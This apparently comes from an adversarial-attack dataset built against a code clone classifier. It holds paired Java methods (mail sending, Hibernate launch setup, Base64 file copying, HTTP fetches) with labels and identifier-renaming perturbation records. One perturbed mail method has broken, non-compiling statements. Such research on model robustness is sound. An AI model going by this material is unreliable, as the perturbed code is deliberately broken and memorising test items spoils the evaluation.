    public void launch(final ILaunchConfiguration configuration, final String mode, final ILaunch launch, final IProgressMonitor monitor) throws CoreException {
        {
            Assert.notNull(configuration);
            Assert.notNull(monitor);
        }
        final String projectName = configuration.getAttribute(INexOpenLaunchConfigurationConstants.NEXOPEN_PROJECT_NAME, """");
        final IProject prj = JavaCore.create(ResourcesPlugin.getWorkspace().getRoot()).getJavaProject(projectName).getProject();
        if (NexOpenProjectUtils.isNexOpenProject(prj)) {
            final IFile pom = prj.getFile(""pom.xml"");
            if (!pom.exists()) {
                throw new IllegalStateException(""Not a NexOpen project. Not Maven2 root pom.xml available"");
            }
            ContentHandlerTemplate.handle(pom, new ContentHandlerCallback() {

                public void processHandle(final Document doc) {
                    handleRootProfile(doc);
                }
            });
            final IFile bpom = prj.getFile(""business/pom.xml"");
            if (!bpom.exists()) {
                throw new IllegalStateException(""Not a NexOpen project. Not Maven2 business pom.xml available"");
            }
            ContentHandlerTemplate.handle(bpom, new ContentHandlerCallback() {

                public void processHandle(final Document doc) {
                    try {
                        handleBusinessProfile(doc, configuration, prj);
                    } catch (final CoreException e) {
                        if (Logger.getLog().isInfoEnabled()) {
                            Logger.getLog().info(""CoreException"", e);
                        }
                        throw new RuntimeException(e);
                    }
                }
            });
            final ByteArrayOutputStream output = new ByteArrayOutputStream();
            try {
                final Properties props = new Properties();
                final String dialectName = configuration.getAttribute(INexOpenLaunchConfigurationConstants.HIBERNATE_DIALECT, ""MySQL5InnoDB"");
                props.setProperty(""hibernate.dialect"", support.getDialectClass(dialectName));
                props.setProperty(""hibernate.connection.driver_class"", configuration.getAttribute(INexOpenLaunchConfigurationConstants.JDBC_DRIVER, ""com.mysql.jdbc.Driver""));
                props.setProperty(""hibernate.connection.url"", configuration.getAttribute(INexOpenLaunchConfigurationConstants.JDBC_URL, ""jdbc:mysql://<host><:port>/<database>""));
                props.setProperty(""hibernate.connection.username"", configuration.getAttribute(INexOpenLaunchConfigurationConstants.JDBC_USERNAME, ""sa""));
                props.setProperty(""hibernate.connection.password"", configuration.getAttribute(INexOpenLaunchConfigurationConstants.JDBC_PASSWORD, """"));
                props.store(output, ""hibernate properties for code generation using NexOpen Tools 1.0.0"");
                final IFile props_file = prj.getFile(""business/src/test/resources/hibernate.properties"");
                if (!props_file.exists()) {
                    props_file.create(new ByteArrayInputStream(output.toByteArray()), true, monitor);
                } else {
                    props_file.setContents(new ByteArrayInputStream(output.toByteArray()), true, false, monitor);
                }
            } catch (final IOException e) {
                Logger.getLog().error(""I/O exception "", e);
                throw new RuntimeException(e);
            } finally {
                try {
                    output.flush();
                    output.close();
                } catch (IOException e) {
                }
            }
            if (NexOpenProjectUtils.is04xProject(prj)) {
                final IFile appContext = prj.getFile(""web/src/main/webapp/WEB-INF/applicationContext.xml"");
                if (!appContext.exists()) {
                    throw new IllegalStateException(""It no exists applicationContext.xml under web/src/main/webapp/WEB-INF, not a NexOpen project"");
                }
                ContentHandlerTemplate.handle(appContext, new ContentHandlerCallback() {

                    public void processHandle(final Document doc) {
                        final Element root = doc.getDocumentElement();
                        final List<Element> beans = XMLUtils.getChildElementsByTagName(root, ""bean"");
                        for (final Element bean : beans) {
                            final String id = bean.getAttribute(""id"");
                            if (""valueListAdapterResolver"".equals(id)) {
                                try {
                                    final String pkgName = configuration.getAttribute(INexOpenLaunchConfigurationConstants.NEXOPEN_PACKAGE, """");
                                    final String className = new StringBuilder(pkgName).append("".vlh.support.AnnotationValueListAdapterResolver"").toString();
                                    bean.setAttribute(""class"", className);
                                    break;
                                } catch (final CoreException e) {
                                    if (Logger.getLog().isInfoEnabled()) {
                                        Logger.getLog().info(""CoreException"", e);
                                    }
                                    throw new RuntimeException(e);
                                }
                            }
                        }
                    }
                });
            }
            {
                final String dialectName = configuration.getAttribute(INexOpenLaunchConfigurationConstants.HIBERNATE_DIALECT, ""MySQL5InnoDB"");
                if (support.isReverseEngineeringFileNeeded(dialectName)) {
                    try {
                        final IFile revengFile = prj.getFile(""business/src/test/resources/"" + support.getReversEngineeringFile(dialectName));
                        if (!revengFile.exists()) {
                            final Bundle bundle = HibernateActivator.getDefault().getBundle();
                            final Path src = new Path(""resources/"" + support.getReversEngineeringFile(dialectName));
                            final InputStream in = FileLocator.openStream(bundle, src, false);
                            final ByteArrayOutputStream baos = new ByteArrayOutputStream();
                            IOUtils.copy(in, baos);
                            String str = baos.toString();
                            str = str.replace(""${schema}"", configuration.getAttribute(INexOpenLaunchConfigurationConstants.JDBC_USERNAME, ""sa""));
                            revengFile.create(new ByteArrayInputStream(str.getBytes()), true, null);
                        }
                    } catch (final IOException e) {
                        if (Logger.getLog().isInfoEnabled()) {
                            Logger.getLog().info(""CoreException"", e);
                        }
                        throw new RuntimeException(e);
                    }
                }
            }
            final IResource resource = (IResource) prj.getAdapter(IResource.class);
            final QualifiedName qn = new QualifiedName(""org.nexopenframework.ide.eclipse.ui"", ""default.profile"");
            final String profile = resource.getPersistentProperty(qn);
            resource.setPersistentProperty(qn, ""reverse-engineering"");
            try {
                final InstallProjectAction action = new InstallProjectAction();
                action.scheduleJob(prj, monitor);
                prj.refreshLocal(2, monitor);
            } finally {
                prj.setPersistentProperty(qn, profile);
            }
        } else {
            Logger.getLog().info(""Not a NexOpen project :: "" + prj);
        }
    }
",222,,LABEL_0,LABEL_0,LABEL_0,-1,"search,query,order,maxResults,encodedQuery,startAt,pageNr,url,httpparams,httpclient,httpget,response,instream,html",,,,0,,0,GA,4903,2.0631165504455566,failed,[]
184,"    public synchronized String encrypt(String plaintext) throws NoSuchAlgorithmException, UnsupportedEncodingException {
        MessageDigest md = null;
        md = MessageDigest.getInstance(""SHA"");
        md.update(plaintext.getBytes(""UTF-8""));
        byte raw[] = md.digest();
        String hash = (new BASE64Encoder()).encode(raw);
        return hash;
    }
 <SPLIT>     public static boolean encodeFileToFile(String infile, String outfile) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.ENCODE);
            out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            byte[] buffer = new byte[65536];
            int read = -1;
            while ((read = in.read(buffer)) >= 0) {
                out.write(buffer, 0, read);
            }
            success = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (Exception exc) {
            }
            try {
                out.close();
            } catch (Exception exc) {
            }
        }
        return success;
    }
",75,,LABEL_0,LABEL_0,LABEL_0,-1,"encrypt,plaintext,UnsupportedEncodingException,md,raw,hash",,,,0,,0,GA,2205,0.7835115313529968,failed,[]
185,"    public static String doPost(String URL, List<NameValuePair> params) {
        try {
            OauthUtil util = new OauthUtil();
            URI uri = new URI(URL);
            HttpClient httpclient = util.getNewHttpClient();
            HttpPost postMethod = new HttpPost(uri);
            StringBuffer paramString = new StringBuffer();
            paramString.append(""OAuth"");
            for (int i = 0; i < params.size(); i++) {
                paramString.append("" "" + params.get(i).getName());
                paramString.append(""=\"""" + encodeUrl(params.get(i).getValue()) + ""\"","");
            }
            String xx = paramString.substring(0, paramString.length() - 1);
            postMethod.addHeader(""Authorization"", xx);
            HttpResponse httpResponse = httpclient.execute(postMethod);
            if (httpResponse.getStatusLine().getStatusCode() == 200) {
                String strResult = EntityUtils.toString(httpResponse.getEntity());
                Log.i(""DEBUG"", ""result: "" + strResult);
                return strResult;
            }
        } catch (Exception e) {
            Log.i(""DEBUG"", e.toString());
        }
        return null;
    }
 <SPLIT>     @Override
    public synchronized void deleteJvmStatistics(String contextName, Date dateFrom, Date dateTo) throws DatabaseException {
        final Connection connection = this.getConnection();
        try {
            connection.setAutoCommit(false);
            String queryString = ""DELETE "" + this.getJvmInvocationsSchemaAndTableName() + "" FROM "" + this.getJvmInvocationsSchemaAndTableName() + "" INNER JOIN "" + this.getJvmElementsSchemaAndTableName() + "" ON "" + this.getJvmElementsSchemaAndTableName() + "".element_id =  "" + this.getJvmInvocationsSchemaAndTableName() + "".element_id WHERE "";
            if (contextName != null) {
                queryString = queryString + "" context_name LIKE ? AND "";
            }
            if (dateFrom != null) {
                queryString = queryString + "" start_timestamp >= ? AND "";
            }
            if (dateTo != null) {
                queryString = queryString + "" start_timestamp <= ? AND "";
            }
            queryString = DefaultDatabaseHandler.removeOrphanWhereAndAndFromSelect(queryString);
            final PreparedStatement preparedStatement = DebugPreparedStatement.prepareStatement(connection, queryString);
            int indexCounter = 1;
            if (contextName != null) {
                preparedStatement.setString(indexCounter, contextName);
                indexCounter = indexCounter + 1;
            }
            if (dateFrom != null) {
                preparedStatement.setTimestamp(indexCounter, new Timestamp(dateFrom.getTime()));
                indexCounter = indexCounter + 1;
            }
            if (dateTo != null) {
                preparedStatement.setTimestamp(indexCounter, new Timestamp(dateTo.getTime()));
                indexCounter = indexCounter + 1;
            }
            preparedStatement.executeUpdate();
            preparedStatement.close();
            connection.commit();
        } catch (final SQLException e) {
            try {
                connection.rollback();
            } catch (final SQLException ex) {
                JeeObserverServerContext.logger.log(Level.SEVERE, ""Transaction rollback error."", ex);
            }
            JeeObserverServerContext.logger.log(Level.SEVERE, e.getMessage());
            throw new DatabaseException(""Error deleting JVM statistics."", e);
        } finally {
            this.releaseConnection(connection);
        }
    }
",253,,LABEL_0,LABEL_0,LABEL_0,-1,"doPost,URL,params,util,uri,httpclient,postMethod,paramString,i,xx,httpResponse,strResult",,,,0,,0,GA,4413,1.6597145239512126,failed,[]
186,"    private void moveFile(File orig, File target) throws IOException {
        byte buffer[] = new byte[1000];
        int bread = 0;
        FileInputStream fis = new FileInputStream(orig);
        FileOutputStream fos = new FileOutputStream(target);
        while (bread != -1) {
            bread = fis.read(buffer);
            if (bread != -1) fos.write(buffer, 0, bread);
        }
        fis.close();
        fos.close();
        orig.delete();
    }
 <SPLIT>     @Override
    public User saveUser(User user) {
        try {
            MessageDigest digest = java.security.MessageDigest.getInstance(""MD5"");
            digest.update(user.getPassword().getBytes(""UTF-8""));
            byte[] hash = digest.digest();
            BigInteger bigInt = new BigInteger(1, hash);
            String hashtext = bigInt.toString(16);
            while (hashtext.length() < 32) {
                hashtext = ""0"" + hashtext;
            }
            user.setPassword(hashtext);
            user.setDataRegjistrimit(new Date());
            return em.merge(user);
        } catch (Exception e) {
            throw new NestedException(e.getMessage(), e);
        }
    }
",103,,LABEL_0,LABEL_0,LABEL_0,-1,"moveFile,orig,target,buffer,bread,fis,fos",,,,0,,0,GA,2614,0.9258328119913737,failed,[]
187,"    public void send(org.hibernate.Session hsession, Session session, String repositoryName, int ideIdint, String to, String cc, String bcc, String subject, String body, Vector attachments, boolean isHtml, String charset, InternetHeaders headers, String priority) throws MailException {
        try {
            if (charset == null) {
                charset = MimeUtility.javaCharset(Charset.defaultCharset().displayName());
            }
            if ((body == null) || body.trim().equals("""")) {
                body = "" "";
            }
            Email email = null;
            if (isHtml) {
                email = new HtmlEmail();
            } else {
                email = new MultiPartEmail();
            }
            email.setCharset(charset);
            Users user = getUser(hsession, repositoryName);
            Identity identity = getIdentity(hsession, ideIdint, user);
            InternetAddress _returnPath = new InternetAddress(identity.getIdeEmail(), identity.getIdeName());
            InternetAddress _from = new InternetAddress(identity.getIdeEmail(), identity.getIdeName());
            InternetAddress _replyTo = new InternetAddress(identity.getIdeReplyTo(), identity.getIdeName());
            InternetAddress[] _to = MessageUtilities.encodeAddresses(to, null);
            InternetAddress[] _cc = MessageUtilities.encodeAddresses(cc, null);
            InternetAddress[] _bcc = MessageUtilities.encodeAddresses(bcc, null);
            if (_from != null) {
                email.setFrom(_from.getAddress(), _from.getPersonal());
            }
            if (_returnPath != null) {
                email.addHeader(""Return-Path"", _returnPath.getAddress());
                email.addHeader(""Errors-To"", _returnPath.getAddress());
                email.addHeader(""X-Errors-To"", _returnPath.getAddress());
            }
            if (_replyTo != null) {
                email.addReplyTo(_replyTo.getAddress(), _replyTo.getPersonal());
            }
            if ((_to != null) && (_to.length > 0)) {
                HashSet aux = new HashSet(_to.length);
                Collections.addAll(aux, _to);
                email.setTo(aux);
            }
            if ((_cc != null) && (_cc.length > 0)) {
                HashSet aux = new HashSet(_cc.length);
                Collections.addAll(aux, _cc);
                email.setCc(aux);
            }
            if ((_bcc != null) && (_bcc.length > 0)) {
                HashSet aux = new HashSet(_bcc.length);
                Collections.addAll(aux, _bcc);
                email.setBcc(aux);
            }
            email.setSubject(subject);
            Date now = new Date();
            email.setSentDate(now);
            File dir = new File(System.getProperty(""user.home"") + File.separator + ""tmp"");
            if (!dir.exists()) {
                dir.mkdir();
            }
            if ((attachments != null) && (attachments.size() > 0)) {
                for (int i = 0; i < attachments.size(); i++) {
                    ByteArrayInputStream bais = null;
                    FileOutputStream fos = null;
                    try {
                        MailPartObj obj = (MailPartObj) attachments.get(i);
                        File file = new File(dir, obj.getName());
                        bais = new ByteArrayInputStream(obj.getAttachent());
                        fos = new FileOutputStream(file);
                        IOUtils.copy(bais, fos);
                        EmailAttachment attachment = new EmailAttachment();
                        attachment.setPath(file.getPath());
                        attachment.setDisposition(EmailAttachment.ATTACHMENT);
                        attachment.setDescription(""File Attachment: "" + file.getName());
                        attachment.setName(file.getName());
                        if (email instanceof MultiPartEmail) {
                            ((MultiPartEmail) email).attach(attachment);
                        }
                    } catch (Exception ex) {
                    } finally {
                        IOUtils.closeQuietly(bais);
                        IOUtils.closeQuietly(fos);
                    }
                }
            }
            String mid = getId();
            if (headers != null) {
                Header xheader;
                Enumeration xe = headers.getAllHeaders();
                for (; xe.hasMoreElements(); ) {
                    xheader = (Header) xe.nextElement();
                    if (xheader.getName().equals(RFC2822Headers.IN_REPLY_TO)) {
                        email.addHeader(xheader.getName(), xheader.getValue());
                    } else if (xheader.getName().equals(RFC2822Headers.REFERENCES)) {
                        email.addHeader(xheader.getName(), xheader.getValue());
                    }
                }
            } else {
                email.addHeader(RFC2822Headers.IN_REPLY_TO, ""<"" + mid + "".JavaMail.duroty@duroty"" + "">"");
                email.addHeader(RFC2822Headers.REFERENCES, ""<"" + mid + "".JavaMail.duroty@duroty"" + "">"");
            }
            if (priority != null) {
                if (priority.equals(""high"")) {
                    email.addHeader(""Importance"", priority);
                    email.addHeader(""X-priority"", ""1"");
                } else if (priority.equals(""low"")) {
                    email.addHeader(""Importance"", priority);
                    email.addHeader(""X-priority"", ""5"");
                }
            }
            if (email instanceof HtmlEmail) {
                ((HtmlEmail) email).setHtmlMsg(body);
            } else {
                email.setMsg(body);
            }
            email.setMailSession(session);
            email.buildMimeMessage();
            MimeMessage mime = email.getMimeMessage();
            int size = MessageUtilities.getMessageSize(mime);
            if (!controlQuota(hsession, user, size)) {
                throw new MailException(""ErrorMessages.mail.quota.exceded"");
            }
            messageable.saveSentMessage(mid, mime, user);
            Thread thread = new Thread(new SendMessageThread(email));
            thread.start();
        } catch (MailException e) {
            throw e;
        } catch (Exception e) {
            throw new MailException(e);
        } catch (java.lang.OutOfMemoryError ex) {
            System.gc();
            throw new MailException(ex);
        } catch (Throwable e) {
            throw new MailException(e);
        } finally {
            GeneralOperations.closeHibernateSession(hsession);
        }
    }
 <SPLIT>     public static GameRecord[] get(String url, float lat, float lon, int count) {
        try {
            HttpURLConnection req = (HttpURLConnection) new URL(url).openConnection();
            req.setRequestMethod(""GET"");
            req.setRequestProperty(GameRecord.GAME_LATITUDE_HEADER, df.format(lat));
            req.setRequestProperty(GameRecord.GAME_LONGITUDE_HEADER, df.format(lon));
            req.setRequestProperty(""X-GameQueryCount"", String.valueOf(count));
            req.connect();
            if (req.getResponseCode() == HttpURLConnection.HTTP_OK) {
                List<GameRecord> gl = new ArrayList<GameRecord>();
                BufferedReader br = new BufferedReader(new InputStreamReader(req.getInputStream()));
                String line;
                while ((line = br.readLine()) != null) {
                    if (!line.startsWith(""#"")) {
                        gl.add(GameRecord.decode(line));
                    }
                }
                return gl.toArray(new GameRecord[gl.size()]);
            } else {
                System.out.println(req.getResponseMessage());
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }
",1214,"    public void send(org.hibernate.Session hSession, Session session, String repoositoryEmail, int ideIdint, String to, String cc, String bcc, String subject, String body, Vector attachments, boolean isHtml, String charset, InternetHeaders headers, String level) throws MailException {
        try {
            if (charset == null) {
                charset = MimeUtility.javaCharset(Charset.defaultCharset().displayName());
            }
            if ((body == null) || body.trim().equals("""")) {
                body = "" "";
            }
            Email email = null;
            if (isHtml) {
                email = new HtmlEmail();
            } else {
                email = new MultiPartEmail();
            }
            email.setCharset(charset);
            Users ususer getUser(hSession, repoositoryEmail);
            Identity identity = getIdentity(hSession, ideIdint, user);
            InternetAddress _returnPath = new InternetAddress(identity.getIdeEmail(), identity.getIdeName());
            InternetAddress _from = new InternetAddress(identity.getIdeEmail(), identity.getIdeName());
            InternetAddress _replyTo = new InternetAddress(identity.getIdeReplyTo(), identity.getIdeName());
            InternetAddress[] _to = MessageUtilities.encodeAddresses(to, null);
            InternetAddress[] _cc = MessageUtilities.encodeAddresses(cc, null);
            InternetAddress[] _abce = MessageUtilities.encodeAddresses(bcc, null);
            if (_from != null) {
                email.setFrom(_from.getAddress(), _from.getPersonal());
            }
            if (_returnPath != null) {
                email.addHeader(""Return-Path"", _returnPath.getAddress());
                email.addHeader(""Errors-To"", _returnPath.getAddress());
                email.addHeader(""X-Errors-To"", _returnPath.getAddress());
            }
            if (_replyTo != null) {
                email.addReplyTo(_replyTo.getAddress(), _replyTo.getPersonal());
            }
            if ((_to != null) && (_to.length > 0)) {
                HashSet aux = new HashSet(_to.length);
                Collections.addAll(aux, _to);
                email.setTo(aux);
            }
            if ((_cc != null) && (_cc.length > 0)) {
                HashSet aux = new HashSet(_cc.length);
                Collections.addAll(aux, _cc);
                email.setCc(aux);
            }
            if ((_abce != null) && (_abce.length > 0)) {
                HashSet aux = new HashSet(_abce.length);
                Collections.addAll(aux, _abce);
                email.setBcc(aux);
            }
            email.setSubject(subject);
            Date now = new Date();
            email.setSentDate(now);
            File dir = new File(System.getProperty(""user.home"") + File.separator + ""tmp"");
            if (!dir.exists()) {
                dir.mkdir();
            }
            if ((attachments != null) && (attachments.size() > 0)) {
                for (int i = 0; i < attachments.size(); i++) {
                    ByteArrayInputStream bais = null;
                    FileOutputStream fos = null;
                    try {
                        MailPartObj obj = (MailPartObj) attachments.get(i);
                        File file = new File(dir, obj.getName());
                        bais = new ByteArrayInputStream(obj.getAttachent());
                        fos = new FileOutputStream(file);
                        IOUtils.copy(bais, fos);
                        EmailAttachment attachment = new EmailAttachment();
                        attachment.setPath(file.getPath());
                        attachment.setDisposition(EmailAttachment.ATTACHMENT);
                        attachment.setDescription(""File Attachment: "" + file.getName());
                        attachment.setName(file.getName());
                        if (email instanceof MultiPartEmail) {
                            ((MultiPartEmail) email).attach(attachment);
                        }
                    } catch (Exception ex) {
                    } finally {
                        IOUtils.closeQuietly(bais);
                        IOUtils.closeQuietly(fos);
                    }
                }
            }
            String mid = getId();
            if (headers != null) {
                Header xheader;
                Enumeration xe = headers.getAllHeaders();
                for (; xe.hasMoreElements(); ) {
                    xheader = (Header) xe.nextElement();
                    if (xheader.getName().equals(RFC2822Headers.IN_REPLY_TO)) {
                        email.addHeader(xheader.getName(), xheader.getValue());
                    } else if (xheader.getName().equals(RFC2822Headers.REFERENCES)) {
                        email.addHeader(xheader.getName(), xheader.getValue());
                    }
                }
            } else {
                email.addHeader(RFC2822Headers.IN_REPLY_TO, ""<"" + mid + "".JavaMail.duroty@duroty"" + "">"");
                email.addHeader(RFC2822Headers.REFERENCES, ""<"" + mid + "".JavaMail.duroty@duroty"" + "">"");
            }
            if (level != null) {
                if (level.equals(""high"")) {
                 emailail.addHeader(""Importance"", level);
                    email.addHeader(""X-priority"", ""1"");
                } else if (level.equals(""low"")) {
                 emailail.addHeader(""Importance"", level);
                    email.addHeader(""X-priority"", ""5"");
                }
            }
            if (email instanceof HtmlEmail) {
                ((HtmlEmail) email).setHtmlMsg(body);
            } else {
                email.setMsg(body);
            }
            email.setMailSession(session);
            email.buildMimeMessage();
            MimeMessage mime = email.getMimeMessage();
            int size = MessageUtilities.getMessageSize(mime);
            if (!controlQuota(hSession, user, size)) {
                throw new MailException(""ErrorMessages.mail.quota.exceded"");
            }
            messageable.saveSentMessage(mid, mime, user);
            Thread thread = new Thread(new SendMessageThread(email));
            thread.start();
        } catch (MailException e) {
            throw e;
        } catch (Exception e) {
            throw new MailException(e);
        } catch (java.lang.OutOfMemoryError ex) {
            System.gc();
            throw new MailException(ex);
        } catch (Throwable e) {
            throw new MailException(e);
        } finally {
            GeneralOperations.closeHibernateSession(hSession);
        }
    }
",LABEL_0,LABEL_0,0.8356782793998718,1,"send,hsession,session,repositoryName,ideIdint,to,cc,bcc,subject,body,attachments,isHtml,charset,headers,priority,email,user,identity,_returnPath,_from,_replyTo,_to,_cc,_bcc",,,,98,"send:send,hsession:hSession,session:session,repositoryName:repoositoryEmail,ideIdint:ideIdint,to:to,cc:cc,bcc:bcc,subject:subject,body:body,attachments:attachments,isHtml:isHtml,charset:charset,headers:headers,priority:level,email:email,user:user,identity:identity,_returnPath:_returnPath,_from:_from,_replyTo:_replyTo,_to:_to,_cc:_cc,_bcc:_abce,",20,GA,911,0.41645021438598634,ga,[]
188,"    public static Collection<Tuple<String, ArrayList<String>>> readGeoParserResult(String recordContent, boolean getGazeteerIds) {
        if (TESTING) {
            HashSet<Tuple<String, ArrayList<String>>> ret = new HashSet<Tuple<String, ArrayList<String>>>();
            ret.add(new Tuple<String, ArrayList<String>>(""teste"", new ArrayList<String>()));
            return ret;
        }
        int retries = 0;
        while (retries < 3) {
            try {
                ArrayList<Tuple<String, ArrayList<String>>> ret = new ArrayList<Tuple<String, ArrayList<String>>>();
                String reqPre = ""<?xml version=\""1.0\""?>\r\n"" + (getGazeteerIds ? ""<GetFeature"" : ""<GetParsing"") + "" xmlns=\""http://www.opengis.net/gp\"" xmlns:wfs=\""http://www.opengis.net/wfs\"""" + "" xmlns:xsi=\""http://www.w3.org/2000/10/XMLSchema-instance\"""" + "" xsi:schemaLocation=\""http://www.opengis.net/gp ../gp/GetFeatureRequest.xsd http://www.opengis.net/wfs ../wfs/GetFeatureRequest.xsd\""\r\n"" + "" wfs:outputFormat=\""GML2\"">"" + ""<wfs:Query wfs:TypeName=\""PlaceName\"" />"" + ""<Resource mine=\""text/plain\"">"" + ""<Contents></Contents>"" + ""</Resource>"" + (getGazeteerIds ? ""</GetFeature>"" : ""</GetParsing>"");
                Document doc = DocumentHelper.parseText(reqPre);
                doc.getRootElement().element(""Resource"").element(""Contents"").setText(recordContent);
                URL url = new URL(geoParserBaseUrl + ""?request="" + URLEncoder.encode(doc.asXML(), ""ISO8859-1""));
                InputStreamReader reader = new InputStreamReader(url.openStream(), ""UTF-8"");
                BufferedReader buffered = new BufferedReader(reader);
                StringBuffer sb = new StringBuffer();
                String line;
                while ((line = buffered.readLine()) != null) {
                    sb.append(line);
                }
                Document d = DocumentHelper.parseText(sb.toString());
                HashSet<String> places = new HashSet<String>();
                for (Iterator<Element> it = d.getRootElement().element(""EntryCollection"").elementIterator(""PlaceName""); it.hasNext(); ) {
                    Element plcEl = it.next();
                    String val = plcEl.elementTextTrim(""TermName"");
                    if (!val.equals("""") && !places.contains(val)) {
                        places.add(val);
                        String entryID = plcEl.attributeValue(""entryID"");
                        Tuple<String, ArrayList<String>> plc = new Tuple<String, ArrayList<String>>(val, new ArrayList<String>());
                        for (Iterator<Element> it2 = d.getRootElement().element(""EntryCollection"").elementIterator(""GazetteerEntry""); it2.hasNext(); ) {
                            Element idEl = it2.next();
                            if (idEl.attributeValue(""entryID"").equals(entryID)) plc.getV2().add(idEl.attributeValue(""id""));
                        }
                        ret.add(plc);
                    }
                }
                return ret;
            } catch (Exception e) {
                log.debug(""Erro ao pesquisar a lista de termos para o registo "" + recordContent + ""! "" + e.getMessage(), e);
                System.out.println(""Erro ao pesquisar a lista de termos para o registo "" + recordContent + ""! "" + e.getMessage());
                retries++;
            }
        }
        System.out.println(""Too many retries. Giving up."");
        return new HashSet<Tuple<String, ArrayList<String>>>();
    }
 <SPLIT>     public static void doVersionCheck(View view) {
        view.showWaitCursor();
        try {
            URL url = new URL(jEdit.getProperty(""version-check.url""));
            InputStream in = url.openStream();
            BufferedReader bin = new BufferedReader(new InputStreamReader(in));
            String line;
            String develBuild = null;
            String stableBuild = null;
            while ((line = bin.readLine()) != null) {
                if (line.startsWith("".build"")) develBuild = line.substring(6).trim(); else if (line.startsWith("".stablebuild"")) stableBuild = line.substring(12).trim();
            }
            bin.close();
            if (develBuild != null && stableBuild != null) {
                doVersionCheck(view, stableBuild, develBuild);
            }
        } catch (IOException e) {
            String[] args = { jEdit.getProperty(""version-check.url""), e.toString() };
            GUIUtilities.error(view, ""read-error"", args);
        }
        view.hideWaitCursor();
    }
",691,,LABEL_1,LABEL_0,,-4,"readGeoParserResult,recordContent,getGazeteerIds,ret,retries,reqPre,outputFormat,doc,url,reader",,,,0,,0,Greedy,1,0.0009166638056437175,,[]
189,"    public static boolean decodeFileToFile(String infile, String outfile) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.DECODE);
            out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            byte[] buffer = new byte[65536];
            int read = -1;
            while ((read = in.read(buffer)) >= 0) {
                out.write(buffer, 0, read);
            }
            success = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (Exception exc) {
            }
            try {
                out.close();
            } catch (Exception exc) {
            }
        }
        return success;
    }
 <SPLIT>     public static String CheckUrl(String urlvalue) {
        String inputLine = """";
        try {
            URL url = new URL(urlvalue);
            HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
            BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            inputLine = in.readLine().toString();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return inputLine;
    }
",194,,LABEL_0,LABEL_0,LABEL_0,-1,"decodeFileToFile,infile,outfile,in,out,buffer,read,success",,,,0,,0,GA,2998,1.0707635919253031,failed,[]
190,"    @Test
    public void testLoadHttpGzipped() throws Exception {
        String url = HTTP_GZIPPED;
        LoadingInfo loadingInfo = Utils.openFileObject(fsManager.resolveFile(url));
        InputStream contentInputStream = loadingInfo.getContentInputStream();
        byte[] actual = IOUtils.toByteArray(contentInputStream);
        byte[] expected = IOUtils.toByteArray(new GZIPInputStream(new URL(url).openStream()));
        assertEquals(expected.length, actual.length);
    }
 <SPLIT>     private File extractUninstallFiles(File _destPath, boolean upgrade, String lastVer) {
        File oldlog = null;
        try {
            boolean oldClassCopied = false;
            File destPath = new File(_destPath, ""vai_"" + VAGlobals.APP_NAME + ""_"" + VAGlobals.APP_VERSION);
            if (upgrade) {
                File lastVerPath = new File(_destPath, ""vai_"" + VAGlobals.APP_NAME + ""_"" + lastVer);
                if (destPath.equals(lastVerPath)) {
                    File bkdir = new File(destPath.getAbsolutePath() + "".bak"");
                    if (!destPath.renameTo(bkdir)) {
                        throw new IOException(VAGlobals.i18n(""Setup_NotCreateDirectory"") + "" "" + destPath);
                    }
                    oldlog = new File(bkdir.getAbsolutePath() + System.getProperty(""file.separator"") + ""uninstall.vai"");
                    lastVerPath = bkdir;
                } else {
                    oldlog = new File(lastVerPath.getAbsolutePath() + System.getProperty(""file.separator"") + ""uninstall.vai"");
                }
                if ((!destPath.exists()) && (!destPath.mkdirs())) {
                    throw new IOException(VAGlobals.i18n(""Setup_NotCreateDirectory"") + "" "" + destPath);
                }
                if (uInfo_.module) oldClassCopied = copyOldSetupClass(lastVerPath, destPath);
            } else {
                if ((!destPath.exists()) && (!destPath.mkdirs())) {
                    throw new IOException(VAGlobals.i18n(""Setup_NotCreateDirectory"") + "" "" + destPath);
                }
            }
            dirty_ = true;
            File[] ls = destPath.listFiles();
            for (int i = 0; i < ls.length; i++) {
                if (!oldClassCopied) ls[i].delete(); else if (!ls[i].getPath().equals(destPath.getAbsolutePath() + File.separator + installClassName_ + "".class"")) ls[i].delete();
            }
            byte[] buf = new byte[0];
            int read = 0;
            if (!oldClassCopied && (installClassSize_ > 0 || jarOffset_ > 0)) {
                final File outClassFile = new File(destPath.getAbsolutePath() + File.separator + installClassName_ + "".class"");
                if (outClassFile.exists() && !outClassFile.delete()) {
                    ui_.showError(new Exception(VAGlobals.i18n(""Setup_FileNotCreated"") + "":\n"" + outClassFile.getName()));
                }
                final FileOutputStream out = new FileOutputStream(outClassFile);
                final FileInputStream in = new FileInputStream(fileWithArchive_);
                if (installClassOffset_ > 0) {
                    in.skip(installClassOffset_);
                }
                buf = new byte[0];
                if (installClassSize_ < 0) buf = new byte[(int) jarOffset_]; else buf = new byte[(int) installClassSize_];
                read = in.read(buf, 0, buf.length);
                out.write(buf, 0, read);
                out.close();
                in.close();
            }
            final FileInputStream in = new FileInputStream(fileWithArchive_);
            if (jarOffset_ > 0) {
                in.skip(jarOffset_);
            }
            JarInputStream jar = new JarInputStream(in);
            final File outJarFile = new File(destPath.getAbsolutePath() + File.separator + ""install.jar"");
            if (outJarFile.exists() && !outJarFile.delete()) {
                ui_.showError(new Exception(VAGlobals.i18n(""Setup_FileNotCreated"") + "":\n"" + outJarFile.getName()));
            }
            JarOutputStream outJar = new JarOutputStream(new FileOutputStream(outJarFile));
            ZipEntry entry = jar.getNextEntry();
            final int bufSize = 32768;
            buf = new byte[bufSize];
            while (entry != null) {
                String entryName = entry.getName();
                if (entryName.equals(""com/memoire/vainstall/resources/vainstall.properties"")) {
                } else if (entryName.equals(installClassName_ + "".class"") && !oldClassCopied) {
                    FileOutputStream out = null;
